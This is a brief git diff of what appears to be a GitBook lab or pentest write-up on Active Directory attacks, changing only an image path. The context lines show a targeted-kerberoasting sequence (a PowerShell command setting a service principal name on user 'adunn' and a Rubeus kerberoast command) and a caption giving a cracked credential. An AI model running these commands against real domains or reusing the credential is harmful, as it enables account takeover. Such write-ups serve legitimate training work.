@@ -165,4 +165,4 @@ Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname=
 .\Rubeus.exe kerberoast /user:adunn /nowrap
 ```
 
-<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption><p>adunn:SyncMaster757</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (19) (2).png" alt=""><figcaption><p>adunn:SyncMaster757</p></figcaption></figure>
